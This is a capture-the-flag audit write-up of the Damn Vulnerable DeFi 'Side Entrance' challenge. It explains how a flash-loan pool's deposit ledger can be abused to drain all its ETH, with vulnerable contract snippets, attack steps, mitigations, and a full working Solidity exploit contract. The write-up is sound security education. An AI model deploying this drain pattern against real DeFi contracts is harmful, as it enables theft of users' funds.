# Side Entrance — Audit Report

**Protocol:** Side Entrance
**Challenge:** Damn Vulnerable DeFi
**Time Spent:** 30 minutes
**Status:** Solved

---

## Executive Summary

**Vulnerability Found:** Flash loan callback credits deposits to borrower’s `balances` ledger, allowing attacker to deposit borrowed ETH during callback and later withdraw the same amount — enabling full drainage.
**Severity:** Critical
**Attack Complexity:** Low–Medium
**Impact:** Full loss of 1000 ETH from pool to attacker recovery account
**Root Cause:** `flashLoan` sends ETH to `msg.sender`’s `execute()` callback, and deposits credited inside callback update `balances[msg.sender]`. The pool relies on its unchanged ETH balance to validate repayment, which is true after the callback if the borrowed ETH was re-deposited. This combination allows attacker to get balance credit and later withdraw.

---

## Challenge Overview

**Objective:** Withdraw all 1000 ETH from the pool and deposit into the designated recovery account in a single exploit flow.

**Initial State:**

* Pool balance: 1,000 ETH
* Attacker balance: 1 ETH
* Pool supports `deposit()`, `withdraw()`, and `flashLoan(uint256 amount)` where `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()` is invoked.

**Success Criteria:**

* [x] Pool drained of ETH
* [x] ETH delivered to recovery account

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **FlashLoan → Deposit → Withdraw** — Profit: 1000 ETH, Cost: Gas only

   * Likelihood: High (attacker can implement `execute()` callback)
   * Impact: Critical (complete drainage)

### Technical Analysis

**Vulnerable Components:**

* `flashLoan(uint256 amount)` (invokes caller's `execute{value: amount}()`)
* `deposit()` (credits `balances[msg.sender]` on `msg.value`)
* `withdraw()` (reads `balances[msg.sender]`, deletes, sends ETH)

**Key contract snippets**

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);
    SafeTransferLib.safeTransferETH(msg.sender, amount);
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

**Why This Is Exploitable:**

* The attacker can request a flash loan for the entire pool balance.
* During `execute()` the attacker contract calls `deposit{value: amount}()` on the pool. Because `deposit` credits `balances[msg.sender]`, the attacker contract receives an internal balance credit equal to the loan amount.
* The pool balance after the callback equals `balanceBefore` (loan amount was returned via `deposit`), so the repay check passes.
* After the flash loan finishes, the attacker contract calls `withdraw()` to claim the credited balance, receiving the ETH and thereby draining the pool.

**Attack Prerequisites:**

* [x] Flash loan facility that forwards ETH to caller via `execute{value: amount}()`
* [x] `deposit()` credits the caller based on `msg.value` (no sender validation)
* [x] `withdraw()` uses `balances[msg.sender]` and transfers ETH to `msg.sender`

---

## Attack Vector

### Step-by-Step Exploit

**Phase 1: Borrow & Credit**

1. Attacker deploys `Exploit` contract that implements `execute()` payable.
2. Exploit calls `pool.flashLoan(amount)` with `amount = 1000 ETH` (entire balance).
3. Pool sends 1000 ETH to `Exploit.execute()`.

**Phase 2: Create Internal Balance**
4. Inside `execute()`, `Exploit` calls `pool.deposit{value: amount}()`. This sets `balances[address(Exploit)] += amount` on the pool.
5. The pool’s `address(this).balance` after `deposit` is equal to `balanceBefore` so the repay check passes.

**Phase 3: Withdraw**
6. After the flashLoan returns, the attacker calls `pool.withdraw()` from `Exploit` (or `Exploit` calls it in the same transaction).
7. `withdraw()` sends the credited 1000 ETH to the attacker-controlled contract, which is then forwarded to the designated recovery account.

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntrancePool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceExploit {
    ISideEntrancePool public pool;
    address payable public recovery;

    constructor(address _pool, address payable _recovery) {
        pool = ISideEntrancePool(_pool);
        recovery = _recovery;
    }

    // start the exploit
    function attack() external {
        pool.flashLoan(address(pool).balance); // request entire pool balance
        // After flashLoan returns, withdraw credited balance
        pool.withdraw();
        // forward funds to recovery
        (bool sent,) = recovery.call{value: address(this).balance}("");
        require(sent);
    }

    // called by pool with borrowed ETH
    function execute() external payable {
        // deposit borrowed ETH back to pool, which credits balances[this]
        pool.deposit{value: msg.value}();
        // return to flashLoan (no explicit return — funds are in pool balance)
    }

    // receive ETH from withdraw
    receive() external payable {}
}
```

**Test assertions (pseudo):**

* `address(pool).balance == 0`
* `recovery.balance == 1000 ether` (plus any initial balance)

---

## Recommendations

### Immediate Fixes

**1. Decouple deposit accounting from caller-sent flashLoan funds**

* `deposit()` should credit the *originating user* (EOA) or require explicit intent, not blindly credit `msg.sender` when called from an arbitrary contract.

**2. Use explicit callback interface semantics & provenance**

* Instead of giving ETH directly to `msg.sender`, require the borrower to register an approved callback address beforehand, or restrict `execute()` to the original `borrower` only.

**3. Disallow `deposit()` during flash loan callbacks**

* Track loan-in-progress and refuse `deposit()` calls initiated from flash loan callbacks (or at minimum require a different flow to register internal balances).

**4. Lock accounting invariant**

* Make the `repay` check robust against internal account crediting, e.g., subtract internal ledger amounts when calculating `balanceBefore` or require that repayment occurs by transfer back to the pool owner, not via `deposit()`.

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** Flash Loan Deposit Reentrancy (Ledger Credit Abuse)

**Description:** If a pool credits an internal ledger based on `msg.value` and the same pool sends ETH to a caller during a flash loan callback, an attacker can re-deposit the loaned funds to create an internal balance and then withdraw them afterward.

**How to Spot It (Red flags):**

* `flashLoan` sends ETH via `execute{value: amount}()` without constraining what the callback can do.
* `deposit()` increases `balances[msg.sender]` based on `msg.value` and can be called during the loan callback.
* `withdraw()` reads `balances[msg.sender]` and transfers ETH back to `msg.sender`.

**Key Takeaways:**

1. Internal accounting must not be trivially manipulated during flash callbacks.
2. Flash loan callbacks should be tightly specified and checked.
3. Never assume `address(this).balance` invariants are sufficient if internal ledger entries can be manipulated during the callback.

**Real-World Examples:** Several CTF-style and production incidents where deposit/withdraw accounting combined with flash loan callbacks enabled full-drain exploits.

---

## Metadata

**Tools Used:** Manual code review, Foundry-style exploit planning
**Pattern Library Entry:** `#03-flashloan-deposit-ledger-abuse`
**Time Breakdown:**

* 00:00-00:07 — Read and map `deposit/withdraw/flashLoan` flows
* 00:07-00:17 — Develop exploit plan and callback logic
* 00:17-00:25 — Write POC and sanity-check balances
* 00:25-00:30 — Finalize write-up & mitigations

**Total Time:** 30 minutes

---

*Report generated on [29-10-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*